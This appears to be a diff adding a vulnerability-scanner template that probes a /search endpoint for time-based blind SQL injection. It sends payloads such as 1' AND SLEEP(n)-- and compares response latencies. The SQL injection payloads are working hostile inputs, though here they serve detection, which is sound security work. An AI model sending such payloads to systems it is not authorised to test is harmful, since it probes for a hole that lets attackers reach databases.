@@ -1,0 +1,28 @@
+name: poc-time-based-sqli
+detail:
+  poc: time-based-sqli
+set:
+  sleepSecond1: randomInt(6, 8)
+  sleepSecond2: randomInt(3, 5)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /search?q=1'+AND+SLEEP(0)--
+    expression: response.status == 200
+    output:
+      r0latency: response.latency
+  r1:
+    request:
+      method: GET
+      path: /search?q=1'+AND+SLEEP({{sleepSecond1}})--
+      read_timeout: "10"
+    expression: response.latency - r0latency >= sleepSecond1 * 1000 - 1000
+  r2:
+    request:
+      method: GET
+      path: /search?q=1'+AND+SLEEP({{sleepSecond2}})--
+      read_timeout: "10"
+    expression: response.latency - r0latency >= sleepSecond2 * 1000 - 1000
+expression: r0() && r1() && r2()
+transport: http
